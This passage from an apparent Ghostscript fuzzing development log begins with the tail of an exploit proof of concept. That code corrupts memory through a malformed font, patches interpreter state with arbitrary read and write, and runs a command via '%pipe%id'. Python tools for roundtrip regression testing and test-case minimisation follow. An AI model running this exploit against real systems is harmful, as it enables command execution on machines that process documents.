    /STRPTR MAGIC 8 8 getinterval def
    /ARRPTR MAGIC 24 8 getinterval def

    (patch) = flush

    /arrptr 8 string def
    arrptr 0 ARRPTR 0 8 copystr

    {
        /arrsz 8 string def

        /next arrptr -40 ptradd -48 ptradd def
        next 16 ptradd arrsz arbrd
        arrsz <d886010000000000> eq { exit } if % 100056

        /next arrptr -56 ptradd -48 ptradd def
        next 16 ptradd arrsz arbrd
        arrsz <e886010000000000> eq { exit } if % 100072

        (unknown header layout) = quit
    } loop

    {
        /head next def

        /next 8 string def
        /cname 8 string def
        /cname_str 21 string def

        head next arbrd
        head 32 ptradd cname arbrd
        cname cname_str arbrd

        cname_str (gs_lib_ctx_init(core)) eq { exit } if
    } loop

    /buf 4 string def
    /ptr1 head 188 ptradd def
    /ptr2 head 204 ptradd def
    ptr1 buf arbrd buf <01000000> eq { ptr1 <00000000> arbwr } if
    ptr2 buf arbrd buf <01000000> eq { ptr2 <00000000> arbwr } if

    (exec) = flush
    (%pipe%id) (w) file

    (done) =
    { 1 pop } loop

    quit
} def  % DONE

/MAIN {

/Myfont
<<
    /FontName /Myfont
    /FontType 1
    /FontMatrix [1 0 0 1 0 0]
    /Private << /lenIV -1 /Subrs [ <0E> ] >>
    /Decoding 0
    /Encoding [ /cs0 /cs1 /cs2 ]
    /CharStrings <<
        /.notdef <0E>
        /cs0 { TEXT 0 1 put /TARGET 312500 array def TARGET REFIDX OBJARR put }
        /cs1 <0E>
        /cs2 { DONE }
    >>
    /WeightVector [1]
    /$Blend {}
    /FontInfo <<
        /BlendAxisTypes [ /foo ]
        /BlendDesignPositions [[1]]
        /BlendDesignMap [[[1]]]
        /GlyphNames2Unicode << >>
    >>
    /Blend <<
        /FontBBox [[1]]
        /Private << >>
    >>
>>
.buildfont1
/FONT exch def
/FONTNAME exch def

FONT setfont

(init) = flush

/TEXT 625000 string def
/SOURCE2 4000002 string def
/SOURCE1 4000002 string def
SOURCE2 REFOFS <7e12> putinterval

FONT /FontInfo get /GlyphNames2Unicode get 1 SOURCE1 put
FONT /CharStrings get /.notdef undef
TEXT 0 0 put
TEXT 1 2 put

(trigger) = flush

0 750 moveto
TEXT show

} def  % MAIN

MAIN
quit

```

first of all the setvmthreshold call just disappeared for some reason. and also our null handling doesn't seem to work correctly. Let's tackle the null thing first...

... an hour later ...

## Fixing bugs in the IR machinery

So there is a load of bugs in the way I represent the stuff. Even roundtripping the snowflak.ps in the ghostpdl doesn't work. Here is a minimal example:

```
/a
{
/b [1] def
} def
```

this is because I vibecoded the entire thing and there is this here: ```# (ignore nested arrays/procs here for brevity; could recurse)``` in the code since I vibecoded it. Time to fix it maybe???

## Testing, testing, testing...

Ok, so I decided to vibecode this regression testing tool:

```
#!/usr/bin/env python3
"""
Batch roundtrip runner for PostScript files.

Usage:
  python3 batch_roundtrip.py <ps_dir> [--run ./run_normal.sh] [--out batch_results]

Notes:
- Assumes:
    import forward as IR      # IR -> PostScript (bytes -> bytes)
    import newreverse as REV  # PostScript -> IR (str -> bytes)
- Your runner script is expected to be: ./run_normal.sh <file.ps>
- We treat a non-zero return code from run_normal.sh as "error".
"""

from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, List, Tuple

# --- imports you said to use ---
import forward as IR      # IR.ir_to_postscript(blob) -> bytes
import newreverse as REV  # REV.ps_to_ir(ps_text: str) -> bytes


def run_ps_with_script(script_path: Path, ps_file: Path, timeout: int = 120) -> Dict[str, Any]:
    """Run ./run_normal.sh PS_FILE and capture exit code + stdout/stderr."""
    proc = subprocess.run(
        [str(script_path), str(ps_file)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        encoding="latin-1",
        timeout=timeout,
    )
    # In Ghostscript land, non-zero returncode is the most reliable signal of error.
    ok = (proc.returncode == 0)
    return {
        "ok": ok,
        "returncode": proc.returncode,
        "stdout": proc.stdout,
        "stderr": proc.stderr,
    }


def roundtrip_ps(ps_text: str) -> Tuple[bytes, str]:
    """
    Convert PS -> IR (bytes) -> PS (latin1 text).
    Returns (ir_blob, roundtripped_ps_text).
    """
    blob = REV.ps_to_ir(ps_text)                    # bytes (IR)
    ps_back = IR.ir_to_postscript(blob)             # bytes
    # IR.ir_to_postscript returns bytes; decode as latin-1 to preserve everything 1:1-ish.
    ps_text_back = ps_back.decode("latin-1", errors="replace")
    return blob, ps_text_back


def write_text(path: Path, text: str) -> None:
    path.write_text(text, encoding="latin-1", errors="replace")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("ps_dir", type=str, help="Directory containing .ps files")
    ap.add_argument("--run", dest="runner", default="./run_normal.sh",
                    help="Runner script (default: ./run_normal.sh)")
    ap.add_argument("--out", dest="outdir", default="batch_results",
                    help="Output directory for logs and artifacts")
    ap.add_argument("--timeout", type=int, default=120, help="Per-run timeout (seconds)")
    args = ap.parse_args()

    ps_dir = Path(args.ps_dir).resolve()
    runner = Path(args.runner).resolve()
    out_root = Path(args.outdir).resolve() / datetime.now().strftime("%Y%m%d-%H%M%S")
    out_root.mkdir(parents=True, exist_ok=True)

    if not ps_dir.is_dir():
        print(f"ERROR: {ps_dir} is not a directory", file=sys.stderr)
        sys.exit(2)
    if not runner.exists():
        print(f"ERROR: runner script not found: {runner}", file=sys.stderr)
        sys.exit(2)

    ps_files = sorted(ps_dir.glob("*.ps"))
    if not ps_files:
        print(f"No .ps files found in {ps_dir}")
        sys.exit(0)

    summary: List[Dict[str, Any]] = []
    print(f"Found {len(ps_files)} .ps files. Results will be in {out_root}")

    for idx, ps_path in enumerate(ps_files, 1):
        rel = ps_path.name
        print(f"[{idx}/{len(ps_files)}] {rel}")

        case_dir = out_root / ps_path.stem
        case_dir.mkdir(parents=True, exist_ok=True)

        # Copy original for convenience
        try:
            shutil.copy2(ps_path, case_dir / ps_path.name)
        except Exception:
            pass

        # 1) Run original
        try:
            r0 = run_ps_with_script(runner, ps_path, timeout=args.timeout)
        except subprocess.TimeoutExpired as te:
            r0 = {"ok": False, "returncode": -9, "stdout": "", "stderr": f"Timeout: {te}"}
        except Exception as e:
            r0 = {"ok": False, "returncode": -8, "stdout": "", "stderr": f"Runner exception: {e!r}"}

        write_text(case_dir / "orig_stdout.txt", r0.get("stdout", ""))
        write_text(case_dir / "orig_stderr.txt", r0.get("stderr", ""))
        orig_ok = bool(r0.get("ok", False))

        # 2) Roundtrip
        try:
            ps_text = ps_path.read_text(encoding="latin-1", errors="replace")
        except Exception as e:
            # If we can’t read the file, record and skip the rest
            ps_text = ""
            convert_fail = True
            convert_err = f"Read error: {e!r}"
        else:
            convert_fail = False
            convert_err = ""

        ir_blob = b""
        roundtrip_text = ""
        if not convert_fail:
            try:
                ir_blob, roundtrip_text = roundtrip_ps(ps_text)
            except Exception as e:
                convert_fail = True
                convert_err = f"Roundtrip exception: {e!r}"

        if convert_fail:
            write_text(case_dir / "convert_error.txt", convert_err)
            # Mark decoder failure as a "roundtrip error" state.
            rt_ok = False
            r1 = {"ok": False, "returncode": -7, "stdout": "", "stderr": convert_err}
        else:
            # Save IR and roundtripped PS
            (case_dir / "ir.bin").write_bytes(ir_blob)
            write_text(case_dir / f"{ps_path.stem}_roundtrip.ps", roundtrip_text)

            # 3) Run roundtripped PS
            rt_ps_path = case_dir / f"{ps_path.stem}_roundtrip.ps"
            try:
                r1 = run_ps_with_script(runner, rt_ps_path, timeout=args.timeout)
            except subprocess.TimeoutExpired as te:
                r1 = {"ok": False, "returncode": -9, "stdout": "", "stderr": f"Timeout: {te}"}
            except Exception as e:
                r1 = {"ok": False, "returncode": -8, "stdout": "", "stderr": f"Runner exception: {e!r}"}

            write_text(case_dir / "rt_stdout.txt", r1.get("stdout", ""))
            write_text(case_dir / "rt_stderr.txt", r1.get("stderr", ""))
            rt_ok = bool(r1.get("ok", False))

        # 4) Classify
        changed = (orig_ok != rt_ok)
        change_type = (
            "regression (OK->ERR)" if (orig_ok and not rt_ok)
            else "fix (ERR->OK)" if (not orig_ok and rt_ok)
            else "no-change (OK->OK)" if orig_ok and rt_ok
            else "no-change (ERR->ERR)"
        )

        row = {
            "file": rel,
            "orig_ok": orig_ok,
            "orig_rc": r0.get("returncode"),
            "rt_ok": rt_ok,
            "rt_rc": r1.get("returncode") if 'r1' in locals() else None,
            "changed": changed,
            "change_type": change_type,
            "case_dir": str(case_dir),
        }
        summary.append(row)

        # Quick console note for suspicious ones
        if changed:
            print(f"  -> BUG? {change_type}. See: {case_dir}")

    # 5) Write summary
    summary_json = out_root / "summary.json"
    summary_csv = out_root / "summary.csv"

    summary_json.write_text(json.dumps(summary, indent=2), encoding="utf-8")

    # CSV
    import csv
    with summary_csv.open("w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=list(summary[0].keys()) if summary else
                           ["file","orig_ok","orig_rc","rt_ok","rt_rc","changed","change_type","case_dir"])
        w.writeheader()
        for row in summary:
            w.writerow(row)

    # Final console summary
    total = len(summary)
    bugs = [r for r in summary if r["changed"]]
    fixes = [r for r in summary if r["change_type"] == "fix (ERR->OK)"]
    regressions = [r for r in summary if r["change_type"] == "regression (OK->ERR)"]
    print()
    print(f"Done. {total} files processed.")
    print(f"  Changes: {len(bugs)}  (fixes: {len(fixes)}, regressions: {len(regressions)})")
    print(f"  Results: {summary_json}")
    print(f"           {summary_csv}")


if __name__ == "__main__":
    main()

```

which runs all of the files and then reports any roundtrip bugs. This should shake out some of them atleast. One bug which I ran into is this here:

```
Traceback (most recent call last):
  File "/home/oof/ghostscript_mutator/newstuff/newreverse.py", line 300, in <module>
    test()
  File "/home/oof/ghostscript_mutator/newstuff/newreverse.py", line 285, in test
    blob = ps_to_ir(ps)
           ^^^^^^^^^^^^
  File "/home/oof/ghostscript_mutator/newstuff/newreverse.py", line 262, in ps_to_ir
    for line in _split_expressions(ps_text):
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oof/ghostscript_mutator/newstuff/newreverse.py", line 108, in _split_expressions
    b = ps.encode('latin1'); i = 0; n = len(b)
        ^^^^^^^^^^^^^^^^^^^
UnicodeEncodeError: 'latin-1' codec can't encode character '\ufeff' in position 50900: ordinal not in range(256)
```

because there are invalid bytes in some postscript files. A "fix" is to just ignore these runes maybe??? Now it works!!!!

Here is my fix:

```
def _split_expressions(ps: str) -> List[str]:
	"""Split PS into logical expressions. If a line starts with /name, keep reading until top-level 'def'."""
	# This ugly hack is to get rid of invalid characters...
	b = ps.encode('latin1', 'ignore'); i = 0; n = len(b)
	out, buf = [], bytearray()
	in_def = False
	while i < n:
```

## Fixing roundtrip bugs

So that still doesn't roundtrip the file. The offending input is here:

Actually the file was too large to copy paste here. Whoops.

I used generative AI to write this minimization tool here:

```
#!/usr/bin/env python3
"""
Minimize a PostScript that passes originally but fails after roundtrip.

Usage:
  python3 minimize_roundtrip.py input.ps [--runner ./run_normal.sh] [--out workdir]
         [--timeout 120] [--flip ok-err|any] [--keep-balanced]

Requirements:
  - forward.py (IR -> PS) as: import forward as IR
  - newreverse.py (PS -> IR) as: import newreverse as REV
  - ./run_normal.sh <file.ps> should run Ghostscript and return 0 on success.
"""

from __future__ import annotations
import argparse, hashlib, json, os, subprocess, sys, time
from pathlib import Path
from typing import Tuple, Dict, Any, List

import forward as IR      # bytes(IR) -> bytes(PS)
import newreverse as REV  # str(PS)   -> bytes(IR)

def run_ps(runner: Path, ps_path: Path, timeout: int) -> Dict[str, Any]:
    try:
        p = subprocess.run(
            [str(runner), str(ps_path)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, encoding="latin-1", timeout=timeout
        )
        return {"ok": p.returncode == 0, "rc": p.returncode, "stdout": p.stdout, "stderr": p.stderr}
    except subprocess.TimeoutExpired as te:
        return {"ok": False, "rc": -9, "stdout": "", "stderr": f"Timeout: {te}"}
    except Exception as e:
        return {"ok": False, "rc": -8, "stdout": "", "stderr": f"Runner exception: {e!r}"}

def roundtrip_ps(ps_text: str) -> Tuple[bytes, str]:
    blob = REV.ps_to_ir(ps_text)
    ps_back = IR.ir_to_postscript(blob)
    return blob, ps_back.decode("latin-1", errors="replace")

def write_text(p: Path, s: str) -> None:
    p.write_text(s, encoding="latin-1", errors="replace")

def sha1(s: str) -> str:
    return hashlib.sha1(s.encode("latin-1", "replace")).hexdigest()

def is_balanced(ps: str) -> bool:
    # light guard to skip obviously broken candidates (saves runs).
    # Not perfect, but helps: balance (), [], {}, and count << >>.
    in_str = False; esc = False; depth = {"()":0, "[]":0, "{}":0, "<<>>":0}
    i, n = 0, len(ps)
    while i < n:
        c = ps[i]
        if in_str:
            if esc: esc = False
            elif c == '\\': esc = True
            elif c == ')': in_str = False
            i += 1; continue
        if c == '%':                         # comment till EOL
            j = ps.find('\n', i); i = (j+1) if j != -1 else n; continue
        if c == '(':
            in_str = True; i += 1; continue
        if c == '[': depth["[]"] += 1
        elif c == ']': depth["[]"] -= 1
        elif c == '{': depth["{}"] += 1
        elif c == '}': depth["{}"] -= 1
        elif c == '<' and i+1 < n and ps[i+1] == '<':
            depth["<<>>"] += 1; i += 1
        elif c == '>' and i+1 < n and ps[i+1] == '>':
            depth["<<>>"] -= 1; i += 1
        i += 1
        if depth["[]"] < 0 or depth["{}"] < 0 or depth["<<>>"] < 0:
            return False
    return not in_str and all(v == 0 for v in depth.values())

class InterestingTest:
    def __init__(self, runner: Path, timeout: int, flip: str):
        self.runner = runner
        self.timeout = timeout
        self.flip = flip  # "ok-err" or "any"
        self.cache: Dict[str, Tuple[bool, Dict[str, Any], Dict[str, Any], bytes, str]] = {}

    def __call__(self, ps_text: str, work: Path = None) -> Tuple[bool, Dict[str, Any], Dict[str, Any], bytes, str]:
        key = sha1(ps_text)
        if key in self.cache:
            return self.cache[key]
        # Write temp original
        tmpdir = work or Path(".").resolve()
        orig = tmpdir / f"__tmp_orig_{key}.ps"
        write_text(orig, ps_text)
        r0 = run_ps(self.runner, orig, self.timeout)
        # Roundtrip
        try:
            blob, rt_text = roundtrip_ps(ps_text)
        except Exception as e:
            # Treat roundtrip crash as a "fail after roundtrip"
            blob, rt_text = b"", ""
            r1 = {"ok": False, "rc": -7, "stdout": "", "stderr": f"Roundtrip exception: {e!r}"}
        else:
            rt = tmpdir / f"__tmp_rt_{key}.ps"
            write_text(rt, rt_text)
            r1 = run_ps(self.runner, rt, self.timeout)
        # Interesting?
        changed = (r0["ok"] != r1["ok"])
        interesting = (changed if self.flip == "any" else (r0["ok"] and not r1["ok"]))
        self.cache[key] = (interesting, r0, r1, blob, rt_text)
        return self.cache[key]

def ddmin_lines(lines: List[str], test: InterestingTest, keep_balanced: bool, outdir: Path) -> List[str]:
    n = 2
    while len(lines) >= 2:
        chunk = max(1, len(lines) // n)
        removed_any = False
        i = 0
        while i < len(lines):
            candidate = lines[:i] + lines[i+chunk:]
            ps = "".join(candidate)
            if (not keep_balanced) or is_balanced(ps):
                ok, *_ = test(ps, outdir)
                if ok:
                    lines = candidate
                    n = max(2, n - 1)
                    removed_any = True
                    break
            i += chunk
        if not removed_any:
            if n >= len(lines): break
            n = min(len(lines), n * 2)
    return lines

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("input", type=str)
    ap.add_argument("--runner", default="./run_normal.sh")
    ap.add_argument("--out", default="min_work")
    ap.add_argument("--timeout", type=int, default=120)
    ap.add_argument("--flip", choices=["ok-err", "any"], default="ok-err",
                    help="'ok-err' = regression only (default), 'any' = any flip")
    ap.add_argument("--keep-balanced", action="store_true",
                    help="Skip candidates that unbalance (),[],{},<<>> to save runs")
    args = ap.parse_args()

    inp = Path(args.input).resolve()
    runner = Path(args.runner).resolve()
    outdir = Path(args.out).resolve()
    outdir.mkdir(parents=True, exist_ok=True)

    original_text = inp.read_text(encoding="latin-1", errors="replace")

    # Verify the original is interesting (or accept if you set --flip any)
    tester = InterestingTest(runner, args.timeout, args.flip)
    interesting, r0, r1, blob, rt_text = tester(original_text, outdir)
    if not interesting:
        print("[!] Input does not exhibit the requested flip condition.")
        print(f"    orig ok={r0['ok']} rc={r0['rc']} ; rt ok={r1['ok']} rc={r1['rc']}")
        print("    Use --flip any if you want to minimize any behavior change.")
        sys.exit(1)

    # Save starting artifacts
    (outdir / "seed.ps").write_text(original_text, encoding="latin-1", errors="replace")
    (outdir / "seed_ir.bin").write_bytes(blob)
    write_text(outdir / "seed_roundtrip.ps", rt_text)
    write_text(outdir / "seed_orig_stdout.txt", r0["stdout"]); write_text(outdir / "seed_orig_stderr.txt", r0["stderr"])
    write_text(outdir / "seed_rt_stdout.txt", r1["stdout"]);   write_text(outdir / "seed_rt_stderr.txt", r1["stderr"])

    # Minimize by lines
    lines = original_text.splitlines(keepends=True)
    print(f"[+] Starting ddmin: {len(lines)} lines")
    minimized = ddmin_lines(lines, tester, args.keep_balanced, outdir)
    minimized_text = "".join(minimized)

    # Final verification
    interesting, r0, r1, blob, rt_text = tester(minimized_text, outdir)
    print(f"[+] Done. Lines: {len(lines)} -> {len(minimized)}")
    print(f"    Final: orig ok={r0['ok']} rc={r0['rc']} ; rt ok={r1['ok']} rc={r1['rc']}")
    (outdir / "minimized.ps").write_text(minimized_text, encoding="latin-1", errors="replace")
    (outdir / "minimized_ir.bin").write_bytes(blob)
    write_text(outdir / "minimized_roundtrip.ps", rt_text)
    write_text(outdir / "min_orig_stdout.txt", r0["stdout"]); write_text(outdir / "min_orig_stderr.txt", r0["stderr"])
    write_text(outdir / "min_rt_stdout.txt", r1["stdout"]);   write_text(outdir / "min_rt_stderr.txt", r1["stderr"])

    # Summary JSON
    summary = {
        "input": str(inp),
        "runner": str(runner),
        "flip": args.flip,
        "keep_balanced": args.keep_balanced,
        "timeout": args.timeout,
        "seed_lines": len(lines),
        "min_lines": len(minimized),
        "orig_ok": r0["ok"], "orig_rc": r0["rc"],
        "rt_ok": r1["ok"], "rt_rc": r1["rc"],
    }
    (outdir / "summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print(f"[i] Artifacts in: {outdir}")

if __name__ == "__main__":
    main()
```

I am going to modify it a little bit to check the actual error instead of the return values etc...

... an hour later ...

ok, so I managed to find this here:

```
<<
  /PageOffset [0 0]
  /Margins [0 0]
  /.HWMargins [0 0 0 0]
>>
setpagedevice
<<
  /ImagingBBox null
>>
setpagedevice

% Determine the actual page size.

clippath pathbbox newpath
/y1 exch def  /x1 exch def  pop pop

% Draw lines that should be exactly 1" in from each edge,
% and should extend precisely to the edge of the paper.

1 setlinewidth
0 setgray
72 0 moveto 0 y1 rlineto stroke
0 72 moveto x1 0 rlineto stroke

% Print the text in the middle of the page.

/S 80 string def
108 480 moveto
/Helvetica 12 selectfont
 { currentfile S readline pop dup (%END) eq { pop exit } if
   gsave show grestore 0 -15 rmoveto
 } loop
Let the distance in inches from the left edge of the page to
the vertical line be H, and from the bottom edge to the
horizontal line be V; let the lengths of the gaps at the top
and bottom of the vertical line be T and B respectively, and
the gaps at the left and right of the horizontal line be L
and R.  For correct alignment of pages, put the following line
in a file named (for example) margins.ps, and then mention
margins.ps on the gs command line when printing any of your
own files:

    <<  /.HWMargins [ml mb mr mt] /Margins [x y]  >>  setpagedevice

where
        ml = L * 72, mb = B * 72, mr = R * 72, mt = T * 72,
%END
/res currentpagedevice /HWResolution get def
(        x = (1 - H) * ) show res 0 get =string cvs show
(, y = (V - 1) * ) show res 1 get =string cvs show

showpage
```

which causes the roundtrip error minimally...

## Even more testing....

So I found a potential bug but it only happens in the debug mode in ghostscript so I banned the function ".setdebug" such that these don't happen...

I also noticed that my ir language thing doesn't handle these cases:

```
oof@elskun-lppri:~/ghostscript_mutator/newstuff$ cat more_minimal.ps

/S 80 string def
108 480 moveto
/Helvetica 12 selectfont
 { currentfile S readline pop dup (%END) eq { pop exit } if
   gsave show grestore 0 -15 rmoveto
 } loop
Let the
%END
showpage
```

which outputs this:

```
/S 80 string def
108 480 moveto
/Helvetica 12 selectfont { currentfile S readline pop dup (%END) eq { pop exit} if gsave show grestore 0 -15 rmoveto} loop Let the showpage
```

and the other `%END` disappears. This is because strings starting with a percent are treated as comments, even though they are not. So I am thinking of adding a function which checks if the string is a special string and then do not remove it.

So I made this somewhat hacky fix to do the thing:

```

# ps_to_ir.py
import re
import struct
from typing import List, Tuple

import setup
import forward as IR

# Build operator index from your FUNCS list
setup.run_setup()
FUNCS = setup.FUNCS
FUNC_INDEX = {name: i for i, (name, _argc) in enumerate(FUNCS)}

# Allowed chars (must match your tiny_ps_ir.ALLOWED_CHARS)
ALLOWED = IR.ALLOWED_CHARS
IDX = {chr(c): i for i, c in enumerate(ALLOWED)}

NUMS = set(list("0987654321"))
HEX_NO_NUMS = set(list("abcdefABCDEF"))
HEX_CHARS = NUMS.union(HEX_NO_NUMS) # Can not do NUMS + HEX_NO_NUMS
SPECIAL_PCT_LINES   = { '%END', '%EOF', '%EOD', '%ENDDATA' }
SPECIAL_PCT_PREFIX  = ('%!', '%%')  # file header and DSC directives

DEBUG = True

def dprint(s: str) -> None:
	if DEBUG:
		print("[DEBUG] " + str(s))

def is_special_pct_line(line: str) -> bool:
	s = line.rstrip('\r\n')
	if any(s.startswith(p) for p in SPECIAL_PCT_PREFIX):
		return True
	# exact-match sentinels
	return s in SPECIAL_PCT_LINES

def pack_allowed(s: bytes) -> bytes:
	out = bytearray()
	s_dec = s.decode('latin1')
	for ch in s_dec:
		if ch in IDX:
			out.append(IDX[ch])
		else:
			dprint("Encountered invalid string: "+str(s_dec))
			# assert False
			out.append(IDX.get('A', 0))  # fallback
	out.append(0xFF)
	return bytes(out)

def pack_raw(s: bytes) -> bytes:
	assert len(s) <= 2**16
	out = struct.pack('<h', len(s)) + s
	assert len(out) == len(s) + 2
	return out

# ------------- Tokenizer (minimal but robust) -------------
_WS = b" \t\r\n\f\v"
_STOP = set(b"()[]{}<>/% \t\r\n\f\v")
_STOP_NO_COMMENT = set(b"()[]{}<>/ \t\r\n\f\v")
_comment = re.compile(rb'%[^\r\n]*')
_number = re.compile(rb'[+-]?(?:\d+\.\d*|\d*\.\d+|\d+)')

def _skip_comment(b: bytes, i: int) -> int:
	n = len(b)
	while i < n and b[i] not in b"\r\n":
		i += 1
	return i

def _read_string(b: bytes, i: int) -> Tuple[str, int]:
	out = bytearray(b'('); i += 1; depth = 1; n = len(b)
	while i < n and depth > 0:
		c = b[i]; out.append(c); i += 1
		if c == ord('\\'):
			if i < n: out.append(b[i]); i += 1
		elif c == ord('('): depth += 1
		elif c == ord(')'): depth -= 1
	return out.decode('latin1'), i

# def _read_string_raw(b: bytes, i: int) -> Tuple[str, int]:


def _read_balanced(b: bytes, i: int, o: int, c: int) -> Tuple[str, int]:
	out = bytearray([b[i]]); i += 1; depth = 1; n = len(b)
	while i < n and depth > 0:
		ch = b[i]
		if ch == ord('%'):
			j = _skip_comment(b, i); out += b[i:j]; i = j; continue
		if ch == ord('('):
			s, i = _read_string(b, i); out += s.encode('latin1'); continue
		out.append(ch); i += 1
		if ch == o: depth += 1
		elif ch == c: depth -= 1
	return out.decode('latin1'), i

def _read_hex_or_dict(b: bytes, i: int) -> Tuple[str, int]:
	n = len(b)
	if i + 1 < n and b[i+1] == ord('<'):
		# dict
		out = bytearray(b'<<'); i += 2; depth = 1
		while i < n and depth > 0:
			if b[i] == ord('%'):
				j = _skip_comment(b, i); out += b[i:j]; i = j; continue
			if b[i] == ord('('):
				s, i = _read_string(b, i); out += s.encode('latin1'); continue
			if i + 1 < n and b[i] == ord('<') and b[i+1] == ord('<'):
				out += b'<<'; i += 2; depth += 1; continue
			if i + 1 < n and b[i] == ord('>') and b[i+1] == ord('>'):
				out += b'>>'; i += 2; depth -= 1; continue
			out.append(b[i]); i += 1
		return out.decode('latin1'), i
	else:
		# hexstring
		out = bytearray(b'<'); i += 1
		while i < n:
			out.append(b[i]); c = b[i]; i += 1
			if c == ord('>'): break
		return out.decode('latin1'), i

def _read_word(b: bytes, i: int, disallowed_chars: set) -> Tuple[str, int]:
	n = len(b); s = i
	while i < n and b[i] not in disallowed_chars:
		i += 1
	return b[s:i].decode('latin1'), i

def _split_expressions(ps: str) -> List[str]:
	"""Split PS into logical expressions. If a line starts with /name, keep reading until top-level 'def'."""
	# This ugly hack is to get rid of invalid characters...
	b = ps.encode('latin1', 'ignore'); i = 0; n = len(b)
	out, buf = [], bytearray()
	in_def = False
	while i < n:
		c = b[i]
		#if c == ord('%'):
		#	i = _skip_comment(b, i); continue

		if c == ord('%'):
			# flush any buffered code on this line
			line = buf.decode('latin1').strip()
			if line:
				out.append(line)
			buf.clear()
			j = _skip_comment(b, i)
			raw = b[i:j].decode('latin1').rstrip()
			dprint("raw: "+str(raw))
			if is_special_pct_line(raw):
				out.append(raw)  # keep as its own expression
			# consume newline if present
			i = j
			if i < n and b[i] in b'\r\n':
				if b[i] == ord('\r') and i+1 < n and b[i+1] == ord('\n'):
					i += 2
				else:
					i += 1
			continue

		if c == ord('('):
			s, i = _read_string(b, i); buf += s.encode('latin1'); continue
		if c == ord('['):
			s, i = _read_balanced(b, i, ord('['), ord(']')); buf += s.encode('latin1'); continue
		if c == ord('{'):
			s, i = _read_balanced(b, i, ord('{'), ord('}')); buf += s.encode('latin1'); continue
		if c == ord('<'):
			s, i = _read_hex_or_dict(b, i); buf += s.encode('latin1'); continue

		if not buf.strip() and c == ord('/'):
			in_def = True

		if in_def and c == ord('d') and b[i:i+3] == b'def' and (i+3 == n or b[i+3] in _WS + b"()[]{}<>/%"):
			buf += b'def'; i += 3
			out.append(buf.decode('latin1').strip()); buf.clear(); in_def = False
			while i < n and b[i] in _WS:
				if b[i] in b'\r\n':
					if b[i] == ord('\r') and i+1 < n and b[i+1] == ord('\n'): i += 2
					else: i += 1
					break
				i += 1
			continue

		if c in (ord('\n'), ord('\r')) and not in_def:
			line = buf.decode('latin1').strip()
			if line: out.append(line)
			buf.clear()
			if c == ord('\r') and i+1 < n and b[i+1] == ord('\n'): i += 2
			else: i += 1
			continue

		buf.append(c); i += 1

	last = buf.decode('latin1').strip()
	if last: out.append(last)
	return out

def _tokenize_expr(expr: str) -> List[Tuple[str, str]]:
	"""Return [('INT','123'), ('ENAME','moveto'), ('LNAME','box'), ('STRING','(abc)'), ...]"""
	b = expr.encode('latin1'); i = 0; n = len(b)
	toks: List[Tuple[str,str]] = []
	while i < n:
		while i < n and b[i] in _WS: i += 1
		if i >= n: break
		c = b[i]
		dprint("Current buffer: "+str(b[i:]))
		if c == ord('%'):
			# Check if special string...
			if not is_special_pct_line(expr):
				i = _skip_comment(b, i); continue # Is not special, so comment.
			else:
				dprint("String "+str(expr)+" is special...")
		elif c == ord('('):
			s, i = _read_string(b, i); toks.append(('STRING', s)); continue
		elif c == ord('['):
			s, i = _read_balanced(b, i, ord('['), ord(']')); toks.append(('ARRAY', s)); continue
		elif c == ord('{'):
			s, i = _read_balanced(b, i, ord('{'), ord('}')); toks.append(('PROC', s)); continue
		elif c == ord('<'):
			s, i = _read_hex_or_dict(b, i); toks.append(('HEXDICT', s)); continue
		elif c == ord('/'):
			i += 1; w, i = _read_word(b, i, _STOP); toks.append(('LNAME', w)); continue
		elif c in (ord('}'), ord(')'), ord('>'), ord(']')):
			i += 1; continue
		m = _number.match(b, i)
		if m:
			txt = m.group(0).decode('latin1'); i = m.end()
			toks.append(('NUM', txt)); continue
		dprint("Current buffer 2: "+str(b[i:]))
		w, i = _read_word(b, i, _STOP_NO_COMMENT)
		dprint("w: "+str(w))
		if w:
			if w not in ("false", "true"):
				toks.append(('ENAME', w))
			else:
				toks.append(('BOOL', 1 if w == "true" else 0))
	return toks

# ------------- Encoder: tokens -> IR (now fully recursive) -------------
def _emit_name(name: str, defined_vars: List[str]) -> bytes:
	if name in FUNC_INDEX:
		idx = FUNC_INDEX[name]
		return bytes([IR.LOOKUP_FUNC]) + struct.pack('<h', idx)
	if ('/' + name) in defined_vars:
		vidx = defined_vars.index('/' + name)
		return bytes([IR.LOOKUP_VAR]) + struct.pack('<h', vidx)
	return bytes([IR.I_ENAME]) + pack_allowed(name.encode('latin1'))

def _emit_number_token(val: str) -> bytes:
	if '.' in val:
		try:
			intpart, frac = val.split('.', 1)
			intpart = max(0, min(0xFFFF, int(intpart or '0')))
			frac = ''.join(ch for ch in frac if ch.isdigit()) or '0'
			frac = max(0, min(0xFFFF, int(frac)))
		except Exception:
			intpart, frac = 0, 0
		u = (intpart << 16) | frac
		return bytes([IR.I_REAL32]) + IR.varint_encode(IR.zz_encode(u))
	else:
		return bytes([IR.I_INT]) + IR.varint_encode(IR.zz_encode(int(val)))

def _clean_hex(s: str) -> str:
	o = ""
	for c in s:
		if c in HEX_CHARS:
			o += c
	return o

def _emit_hex_or_dict(val: str, defined_vars: List[str]) -> bytes:
	if val.startswith('<<'):
		# Keep as empty dict placeholder for now
		# return bytes([IR.DICT_S]) + bytes([IR.DICT_E])
		# Parse the inner tokens and keep them
		inner = val[2:-2]
		out = bytearray([IR.DICT_S])
		inner_toks = _tokenize_expr(inner)
		encode_tokens(inner_toks, defined_vars, out)
		out.append(IR.DICT_E)
		return bytes(out)
	else:
		# hexstring
		s = val[1:-1].strip()
		# Just throw out all non-hex characters...
		s = _clean_hex(s)
		# Maybe we should actually check like this here:
		# if len(s) % 2 == 1:
		# 	s = s + "0"
		if len(s) % 2 == 1:
			s = s[:-1] + "0" + s[-1]
		dprint("s: "+str(s))
		hexbytes = bytes.fromhex(s)
		return bytes([IR.I_HEX]) + pack_raw(hexbytes)

def encode_tokens(toks: List[Tuple[str, str]], defined_vars: List[str], out: bytearray) -> None:
	"""
	Recursively encode a token list into IR.
	Handles nested ARRAY and PROC (and HEXDICT) anywhere.
	"""
	for kind, val in toks:
		if kind == 'NUM':
